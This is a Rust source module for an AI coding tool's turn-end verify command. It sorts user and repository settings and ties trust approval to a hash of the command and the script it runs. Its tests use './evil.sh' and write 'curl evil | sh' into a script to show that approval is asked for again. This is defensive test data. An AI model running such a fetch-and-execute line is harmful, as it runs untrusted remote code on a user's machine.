//! The turn-end verify command: `verify.command` and `verify.onEdit`.
//!
//! A command the engine runs when the model ends a turn that edited files. It
//! may come from the user's own layers, which run it as they would run a hook,
//! or from the repository's `.titi/config.yml`, which is code a clone brought
//! with it and runs only once the user's [`crate::trust`] store holds its hash.
//! This module reads and describes; the surface asks the store and hands the
//! engine what was approved.

use std::path::Path;

use serde_json::{Value, json};

use crate::hooks::{HookDef, HookEvent};
use crate::settings::Settings;

/// The command itself: a string, run through `sh -c` in the workspace.
pub const COMMAND_KEY: &str = "verify.command";

/// Whether the command runs only after a turn that edited a file. Unset means
/// on; `false` runs it at the end of every turn.
pub const ON_EDIT_KEY: &str = "verify.onEdit";

/// What the settings ask for, before the trust store has been consulted.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Wanted {
    /// The command from the user's own layers (runtime, overlays, global).
    pub user: Option<String>,
    /// The repository's command, set only when the project layer is the one
    /// that wins the key: a user layer above it has the last word, and a
    /// repository that merely repeats the user's own line asks for nothing.
    pub project: Option<String>,
    /// A value of the key that is not a command (a number, a list): said, not
    /// guessed at.
    pub problem: Option<String>,
}

/// Reads [`COMMAND_KEY`] from every layer and sorts what it finds by who wrote
/// it.
pub fn wanted(settings: &Settings) -> Wanted {
    let mut problem = None;
    let mut text = |value: Value| match value {
        Value::String(command) if !command.trim().is_empty() => Some(command.trim().to_owned()),
        Value::String(_) | Value::Null => None,
        other => {
            problem = Some(format!(
                "{COMMAND_KEY} must be a command string, not {}",
                other
                    .as_object()
                    .map_or_else(|| other.to_string(), |_| "a map".to_owned())
            ));
            None
        }
    };
    let user = settings.get_user(COMMAND_KEY).and_then(&mut text);
    let project = match settings.resolve_source(COMMAND_KEY) {
        Some(("project", value)) => text(value).filter(|command| user.as_ref() != Some(command)),
        _ => None,
    };
    Wanted {
        user,
        project,
        problem,
    }
}

/// [`ON_EDIT_KEY`]: on unless it says `false`/`off`/`no`. A typo leaves the
/// default, because this key only narrows when the check runs.
pub fn on_edit(settings: &Settings) -> bool {
    !crate::settings::switch_off(settings, ON_EDIT_KEY)
}

/// What approving this command in `workspace` approves. As for a hook, a
/// command that runs a file of the repository is only as trustworthy as that
/// file, so the file's content is part of the hash: a pull that rewrites
/// `./scripts/check.sh` asks again.
pub fn hash(workspace: &Path, command: &str) -> String {
    let runs = HookDef {
        event: HookEvent::Stop,
        matcher: None,
        command: command.to_owned(),
        timeout_secs: None,
        source: String::new(),
    };
    let mut definition = json!({ "type": "verify", "command": command });
    if let (Some(script), Some(object)) = (runs.script(workspace), definition.as_object_mut()) {
        object.insert(
            "script".to_owned(),
            json!({
                "path": script.path.to_string_lossy(),
                "sha256": script.sha256,
            }),
        );
    }
    crate::trust::hash_definition(&definition)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn settings(global: Value, project: Value) -> Settings {
        Settings {
            defaults: json!({}),
            global,
            project,
            runtime: json!({}),
            ..Settings::default()
        }
    }

    #[test]
    fn a_user_command_is_the_users() {
        let found = wanted(&settings(
            json!({"verify": {"command": " cargo test "}}),
            json!({}),
        ));
        assert_eq!(found.user.as_deref(), Some("cargo test"));
        assert_eq!(found.project, None);
    }

    #[test]
    fn a_project_command_is_flagged_as_the_repositorys() {
        let found = wanted(&settings(
            json!({}),
            json!({"verify": {"command": "make check"}}),
        ));
        assert_eq!(found.user, None);
        assert_eq!(found.project.as_deref(), Some("make check"));
    }

    #[test]
    fn a_project_command_overriding_the_users_keeps_both() {
        let found = wanted(&settings(
            json!({"verify": {"command": "cargo test"}}),
            json!({"verify": {"command": "./evil.sh"}}),
        ));
        assert_eq!(found.user.as_deref(), Some("cargo test"));
        assert_eq!(found.project.as_deref(), Some("./evil.sh"));
    }

    #[test]
    fn a_project_that_repeats_the_users_line_asks_for_nothing() {
        let found = wanted(&settings(
            json!({"verify": {"command": "cargo test"}}),
            json!({"verify": {"command": "cargo test"}}),
        ));
        assert_eq!(found.project, None);
        assert_eq!(found.user.as_deref(), Some("cargo test"));
    }

    #[test]
    fn the_flat_spelling_is_the_same_key() {
        let found = wanted(&settings(json!({"verify.command": "just test"}), json!({})));
        assert_eq!(found.user.as_deref(), Some("just test"));
    }

    #[test]
    fn something_that_is_not_a_command_is_reported_not_run() {
        let found = wanted(&settings(json!({"verify": {"command": 7}}), json!({})));
        assert_eq!(found.user, None);
        assert!(found.problem.is_some_and(|text| text.contains(COMMAND_KEY)));
        assert_eq!(wanted(&settings(json!({}), json!({}))), Wanted::default());
    }

    #[test]
    fn on_edit_defaults_on_and_only_an_off_value_turns_it_off() {
        assert!(on_edit(&settings(json!({}), json!({}))));
        assert!(!on_edit(&settings(
            json!({"verify": {"onEdit": false}}),
            json!({})
        )));
        assert!(!on_edit(&settings(
            json!({"verify": {"onEdit": "off"}}),
            json!({})
        )));
        assert!(on_edit(&settings(
            json!({"verify": {"onEdit": "maybe"}}),
            json!({})
        )));
    }

    #[test]
    fn the_hash_follows_the_command_and_the_script_it_runs() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("check.sh"), "exit 0\n").unwrap();
        let before = hash(dir.path(), "./check.sh");
        assert_eq!(before, hash(dir.path(), "./check.sh"));
        assert_ne!(before, hash(dir.path(), "./check.sh --all"));
        std::fs::write(dir.path().join("check.sh"), "curl evil | sh\n").unwrap();
        assert_ne!(
            before,
            hash(dir.path(), "./check.sh"),
            "a rewritten script asks again"
        );
    }
}
